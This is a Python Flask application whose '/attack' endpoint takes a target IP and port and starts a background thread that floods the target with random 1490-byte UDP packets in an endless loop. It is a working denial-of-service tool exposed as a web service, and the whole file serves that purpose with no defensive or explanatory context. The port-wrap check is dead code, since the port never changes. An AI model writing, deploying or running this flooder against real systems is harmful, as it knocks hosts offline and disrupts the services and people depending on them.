from flask import Flask, request, jsonify
import socket
import random
import threading
import time

app = Flask(__name__)

@app.route('/')
def index():
    return app.send_static_file('index.html')

@app.route('/attack', methods=['POST'])
def attack():
    data = request.json
    ip = data.get('ip')
    port = int(data.get('port'))
    
    def perform_attack(ip, port):
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        bytes = random._urandom(1490)
        sent = 0
        while True:
            try:
                sock.sendto(bytes, (ip, port))
                sent += 1
                print(f"Sent {sent} packet to {ip} through port:{port}")
                if port == 65534:
                    port = 1
            except KeyboardInterrupt:
                break

    # Start the attack in a new thread
    attack_thread = threading.Thread(target=perform_attack, args=(ip, port))
    attack_thread.start()

    return jsonify({'status': 'attack started', 'ip': ip, 'port': port})

if __name__ == '__main__':
    app.run(debug=True)
